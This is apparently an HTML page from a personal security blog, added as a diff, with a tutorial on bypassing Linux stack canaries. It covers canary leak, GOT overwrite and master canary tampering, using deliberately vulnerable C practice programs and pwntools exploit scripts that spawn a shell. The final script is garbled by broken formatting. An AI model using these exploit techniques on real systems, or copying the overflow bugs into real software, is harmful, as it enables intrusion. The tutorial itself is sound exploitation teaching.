@@ -1,0 +1,316 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Canary bypass · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ We discussed canary in the previous post. This time we will cover the workarounds. 1. canary leak 2. got overwrite (I will explain it briefly, and more details will be discussed after posting about plt/got.) 3. master can">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-canary-bypass/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-canary-bypass/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-canary-bypass/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Canary bypass · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ We discussed canary in the previous post. This time we will cover the workarounds. 1. canary leak 2. got overwrite (I will explain it briefly, and more details will be discussed after posting about plt/got.) 3. master can"><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-canary-bypass/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Canary bypass","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ We discussed canary in the previous post. This time we will cover the workarounds. 1. canary leak 2. got overwrite (I will explain it briefly, and more details will be discussed after posting about plt/got.) 3. master can","datePublished":"2023-09-24","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-canary-bypass/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-canary-bypass/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Canary bypass</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ We discussed canary in the previous post. This time we will cover the workarounds. 1. canary leak 2. got overwrite (I will explain it briefly, and more details will be discussed after posting about plt/got.) 3. master can</p><div class="article-meta"><time datetime="2023-09-24">Sep 24, 2023</time><span>·</span><span>4 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will make corrections after confirmation.</strong> <strong>※</strong> </p>
+<p>I discussed canary in a previous post.</p>
+<p>This time we will cover the workarounds.</p>
+<p><strong>1. canary leak</strong></p>
+<p><strong>2. got overwrite (I will only explain it briefly, and more details will be discussed after posting about plt/got.)</strong></p>
+<p><strong>3. master canary tampering</strong></p>
+<p><strong>4. Reset thread area</strong></p>
+<hr>
+<h3>canary leak</h3>
+<p>The most common method is to use Linux’s stack sorting feature and the feature that the canary ends with \x00.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/001.png" alt=""></p>
+<p>Hands-on example code</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+void getshell(){
+    execve(&quot;/bin/sh&quot;,0,0);
+}
+
+int main(){
+    int buf[0x30];
+
+    printf(&quot;Hello! Whrd\n Input : &quot;);
+    read(0,buf,0x100);
+    printf(&quot;Your Input : [%s]\n\n&quot;,buf);
+
+    printf(&quot;Input : &quot;);
+    read(0,buf,0x100);
+
+    return 0;
+}
+</code></pre>
+<p>This is the protection technique applied. </p>
+<p>Everything is on hold except PIE. (It has been removed for convenience)</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/002.png" alt=""></p>
+<p>The vulnerability occurs in the read() function, such as when doing bof.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/003.png" alt=""></p>
+<p>The location of buf called in read is rbp-0xd0.</p>
+<p>We will perform the same attack using the Return Address Overwrite technique we learned earlier.</p>
+<pre><code>from pwn import*
+
+p = process('./cny')
+e = ELF('./cny')
+context.log_level='debug'
+
+getshell = e.sym['getshell']
+
+payload = b'a'*0xd0
+payload += b'b'*0x8
+payload += p64(getshell)
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/004.png" alt=""></p>
+<p>Because the canary is broken, it ends with a stack smashing message popping up.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/005.png" alt=""></p>
+<p>Linux has the characteristic of aligning data by 8 bytes on a 64-byte basis.</p>
+<p>In that case, if you input only 1 byte of that canary value,</p>
+<p>It can be hypothesized that when buf is output in the next printf, the remaining 7 bytes will also be output.</p>
+<p>As a canary, the last 1 byte has a fixed value of \x00.</p>
+<p>Therefore, it is conceivable that canaries can be identified and attacked based on the above hypothesis.</p>
+<p>I will check it right away.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/006.png" alt=""></p>
+<p>The canary location on the stack is rbp-0x8.</p>
+<p>Since the location of buf is rbp-0xd0, you only need to enter dummy as much as 0xc8 and enter one more byte.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/007.png" alt=""></p>
+<p>This is the current canary value.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/008.png" alt=""></p>
+<p>Looking at the canary part, 1 byte \x00 has been modified to \x61.</p>
+<p>You can get a canary by changing this value to \x00.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/009.png" alt=""></p>
+<p>You can see that the obtained value is canary.</p>
+<p>Using this value, enter the payload as shown below.</p>
+<p>dummy(0xc0) + canary(0x8) + sfp(0x8) + ret(0x8)</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/010.png" alt=""></p>
+<p>This is the entire payload.</p>
+<pre><code>from pwn import*
+
+p = process('./cny')
+e = ELF('./cny')
+#context.log_level='debug'
+
+getshell = e.sym['getshell']
+
+payload = b'a'*0xc9
+
+p.send(payload)
+
+p.recvuntil(payload)
+cny = u64(b'\x00' + p.recvn(7))
+print(hex(cny))
+
+pause()
+
+payload = b'a'*0xc8
+payload += p64(cny)
+payload += b'b'*0x8
+payload += p64(getshell)
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<hr>
+<h3>got overwrite</h3>
+<p>This method requires knowledge of plt/got and got overwrite, which will be covered later.</p>
+<p>So for now, I’ll just look at how it works and move on.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/011.png" alt=""></p>
+<p>If you look at the function, you can see that there is something called __stack_chk_fail@plt.</p>
+<p>The address is not the actual address of the function. </p>
+<p>In the case of real addresses, they are located in the order plt =&gt; got =&gt; real address.</p>
+<p>Therefore, if the actual address, which is the value pointed to by got, is altered to a different value, </p>
+<p>Abnormal termination can be bypassed by blocking the call to the function.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/012.png" alt=""></p>
+<hr>
+<h3>master canary tampering</h3>
+<p>This is a method of modifying the canary value located in the thread area.</p>
+<p>I tried to make a practice example, but it didn’t work out well, so I will proceed with the example used at <a href="http://dreamhack.io">dreamhack.io</a>.</p>
+<pre><code>#include &lt;pthread.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void giveshell() { execve(&quot;/bin/sh&quot;, 0, 0); }
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+
+void read_bytes(char *buf, int size) {
+  int i;
+
+  for (i = 0; i &lt; size; i++)
+    if (read(0, buf + i*8, 8) &lt; 8)
+      return;
+}
+
+void thread_routine() {
+  char buf[256];
+  int size = 0;
+  printf(&quot;Size: &quot;);
+  scanf(&quot;%d&quot;, &amp;size);
+  printf(&quot;Data: &quot;);
+  read_bytes(buf, size);
+}
+
+int main() {
+  pthread_t thread_t;
+
+  init();
+
+  if (pthread_create(&amp;thread_t, NULL, (void *)thread_routine, NULL) &lt; 0) {
+    perror(&quot;thread create error:&quot;);
+    exit(0);
+  }
+  pthread_join(thread_t, 0);
+  return 0;
+}
+</code></pre>
+<p>First of all, if you look at the code, a bof vulnerability occurs in thread_routine().</p>
+<p>Since this is a function where you input the desired size and receive input equal to that size, you can enter a value greater than 256.</p>
+<p>To use this method, you need to find the distance between the thread area and buf.</p>
+<p>The arguments entered into the read_bytes function include rbp-0x114 and rbp-0x110.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/013.png" alt=""></p>
+<p>Since the first argument is buf, rbp-0x110 entered into rdi corresponds to buf.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/014.png" alt=""></p>
+<p>If you find the distance between them, you will get the value 0x928.</p>
+<p>If you enter this value as is, the attack will fail.</p>
+<p>This requires looking at the structure of the fs part.</p>
+<pre><code>from pwn import*
+
+p = process('./mc_thread')
+e = ELF('./mc_thread')
+
+give_shell = e.sym['giveshell']
+
+payload = b'A' * 0x108 #buf
+payload += b'B' * 0x8 #new cny
+payload += b'A' * 0x8 #sfp
+payload += p64(give_shell) #ret
+
+payload += b'A' * (0x928 - len(payload)) #dummy
+payload += b'B' * 0x8 #new Master cny
+
+p.sendlineafter(b&quot;Size: &quot;, str(len(payload)))
+p.sendafter(b&quot;Data: &quot;, payload)
+
+p.interactive()
+</code></pre>
+<p>This is a payload that sets the newly set canary to BBBBBBBB.</p>
+<p>Sending data including dumy is modulated up to fs_base + 0x28.</p>
+<p>The problem is that all data is altered with A.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/015.png" alt=""></p>
+<pre><code>//REG 상태
+RAX  0x4141414141414141 ('AAAAAAAA')
+RBX  0x7f5d06b88640 ◂— 0x4141414141414141 ('AAAAAAAA')
+RCX  0x7f5d06ca09cc (read+76) ◂— cmp rax, -0x1000 /* 'H=' */
+RDX  0x8
+RDI  0x0
+RSI  0x7f5d06b88650 ◂— 0x4141414141414141 ('AAAAAAAA')
+
+//오류 부분
+0x00007f5d06c1caf2 &lt;+18&gt;:  mov    BYTE PTR [rax+0x972],0x0
+</code></pre>
+<p>If you check the part where the error occurred, it is the part where 0 is inserted into the address rax+0x972.</p>
+<p>In the current situation, the rax register contains 0x4141414141414141.</p>
+<p>In that case, only the rax value needs to be entered as a valid address value - 0x972.</p>
+<p>The following is part of the code taken from <a href="http://dreamhack.io">dreamhack.io</a>.</p>
+<pre><code>/* glibc-2.35/sysdeps/x86_64/nptl/tls.h */
+/* Return the thread descriptor for the current thread. */
+#  define THREAD_SELF \
+  ({ struct pthread *__self;                  \
+     asm (&quot;mov %%fs:%c1,%0&quot; : &quot;=r&quot; (__self)             \
+    : &quot;i&quot; (offsetof (struct pthread, header.self)));          \
+     __self;})
+/* glibc-2.35/sysdeps/nptl/pthread.h */
+enum
+{
+  PTHREAD_CANCEL_DEFERRED,
+#define PTHREAD_CANCEL_DEFERRED PTHREAD_CANCEL_DEFERRED
+  PTHREAD_CANCEL_ASYNCHRONOUS
+#define PTHREAD_CANCEL_ASYNCHRONOUS PTHREAD_CANCEL_ASYNCHRONOUS
+};
+/* glibc-2.35/nptl/cancellation.c */
+void
+__pthread_disable_asynccancel (int oldtype)
+{
+  /* If asynchronous cancellation was enabled before we do not have
+     anything to do.  */
+  if (oldtype == PTHREAD_CANCEL_ASYNCHRONOUS)
+    return;
+  struct pthread *self = THREAD_SELF;
+  self-&gt;canceltype = PTHREAD_CANCEL_DEFERRED;
+}
+</code></pre>
+<p>If you look at the whole thing, it is complicated, so I will focus on the necessary parts.```
+self-&gt;canceltype = PTHREAD_CANCEL_DEFERRE</p>
+<pre><code>
+The value is set by accessing self -&gt; canceltype of the structure.
+
+At this time, it is covered with 0x4141414141414141 by the payload we entered.
+
+</code></pre>
+<p>struct pthread *self = THREAD_SELF;</p>
+<pre><code>
+In the case of self, the value is taken from THREAD\_SELF.
+
+THREAD\_SELF is a macro that retrieves a Thread Descriptor. 
+
+Retrieves the value that is offset from header.self in the pthread structure.
+
+![](/assets/images/tistory/tistory-136d7c463f6c/016.png)
+
+In the current situation, everything, including self, is covered with the same value.
+
+It is located at an address 0x10 higher than stack\_gaurd, which means canary.
+
+Then, just send the payload dumy as 0x918.
+
+</code></pre>
+<p>from pwn import*</p>
+<p>p = process(‘./mc_thread’)
+e = ELF(‘./mc_thread’)</p>
+<p>give_shell = e.sym[‘giveshell’]</p>
+<p>payload = b’A’ * 0x108 #buf
+payload += b’B’ * 0x8 #new cny
+payload += b’A’ * 0x8 #sfp
+payload += p64(give_shell) #ret
+payload += b’A’*(0x910-len(payload))
+payload += p64(0x404f80-0x972) # valid address for fs:0x10 + 0x972
+payload += b’B’*0x10 # DUMMY
+payload += b’B’ * 0x8 #new Master cny</p>
+<p>p.sendlineafter(&quot;Size: &quot;, str(len(payload)))
+p.sendlineafter(&quot;Data: &quot;, payload)</p>
+<p>p.interactive()</p>
+<pre><code>
+This is the final modified code. 
+
+![](/assets/images/tistory/tistory-136d7c463f6c/017.png)
+
+* * *
+
+### Reset thread area
+
+(In progress - example creation and practice steps)</code></pre>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-canary-bypass/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
